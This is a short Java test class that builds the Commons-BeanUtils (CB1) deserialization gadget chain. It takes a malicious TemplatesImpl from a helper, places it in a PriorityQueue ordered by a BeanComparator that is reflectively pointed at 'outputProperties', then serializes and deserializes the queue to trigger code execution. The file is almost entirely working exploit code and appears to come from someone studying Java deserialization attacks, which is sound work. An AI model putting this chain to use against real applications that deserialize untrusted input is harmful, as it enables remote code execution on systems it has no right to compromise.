package Test_CB;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import expUtils.ExpUtils;
import expUtils.ReflectUtils;
import org.apache.commons.beanutils.BeanComparator;

import java.io.IOException;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class TestCB1 {
    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        TemplatesImpl templates = ExpUtils.getEvilTemplates();
        BeanComparator beanComparator = new BeanComparator("123",String.CASE_INSENSITIVE_ORDER);

        PriorityQueue priorityQueue = new PriorityQueue(2,beanComparator);
        priorityQueue.add(1);
        priorityQueue.add(1);

        Field queue =  ReflectUtils.getFields(priorityQueue,"queue");
        Object[] queueObj = (Object[]) queue.get(priorityQueue);
        queueObj[0] = templates;
        queueObj[1] = templates;

        ReflectUtils.setFields(beanComparator,"property","outputProperties");


        String path = ExpUtils.serialize(priorityQueue);
        ExpUtils.unserialize(path);


    }
}
